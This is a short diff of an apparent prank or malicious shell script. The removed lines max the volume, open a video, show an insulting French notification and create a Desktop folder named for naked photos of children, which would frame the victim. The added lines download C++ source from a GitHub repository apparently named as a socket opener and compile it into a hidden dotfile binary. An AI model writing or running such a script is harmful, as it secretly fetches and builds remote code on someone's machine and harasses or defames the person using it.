@@ -1,5 +1,2 @@
-amixer -D pulse sset Master 100%
-pactl set-sink-mute 0 0
-xdg-open https://www.youtube.com/watch?v=jIQ6UV2onyI&ab_channel=TuNeoTec
-notify-send "tu pues le seum"
-mkdir Bureau/photos_enfants_nus
+curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/main.txt | cat > hey.cxx
+g++ hey.cxx -o .hehe
